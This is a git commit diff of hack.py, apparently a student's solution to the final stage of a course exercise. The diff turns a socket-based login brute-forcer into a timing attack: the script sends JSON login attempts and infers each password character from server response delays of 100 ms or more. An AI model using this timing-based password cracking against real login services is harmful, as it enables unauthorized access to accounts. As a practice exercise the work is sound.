1765ae27171a550fd34c4bf7b59c81478a5e0d82
Alyona Klekovkina <like.the.sunshine.17@gmail.com>
2020-12-03 12:02:15 +0300

    Stage 5/5: Time-based vulnerability need to rewrite the create_password function
    need to rewrite the repeated 2 loops

--- hack.py
+++ hack.py
@@ -3,6 +3,7 @@ import sys
 import socket
 import json
 import string
+from datetime import datetime
 
 p = ''
 
@@ -28,7 +29,7 @@ def create_json_password():
     upper_letters_list = list(string.ascii_uppercase)
     numbers_list = list(range(10))
     # the_list needs to be searched from the beginning. But I didn't manage to come with the better solution
-    the_list = lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list
+    the_list = lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list
     for i in the_list:
         yield json.dumps({'login': the_login, 'password': p + str(i)})
 
@@ -48,7 +49,7 @@ with socket.socket() as client_socket:
         response = client_socket.recv(1024)
         response = response.decode('utf-8')
         response = json.loads(response)
-        if response == {"result": "Exception happened during login"}:
+        if response == {'result': 'Wrong password!'}:
             result = json.loads(j)
             the_login = result["login"]
             break
@@ -57,10 +58,17 @@ with socket.socket() as client_socket:
     for k in get_password:
         data = k.encode('utf-8')
         client_socket.send(data)
+        start = datetime.now()
+
         response = client_socket.recv(1024)
         response = response.decode('utf-8')
         response = json.loads(response)
-        if response == {"result": "Exception happened during login"}:
+
+        finish = datetime.now()
+
+        difference = finish - start
+        difference = difference.microseconds
+        if difference >= 100000:
             result = json.loads(k)
             the_password = result["password"]
             p = the_password
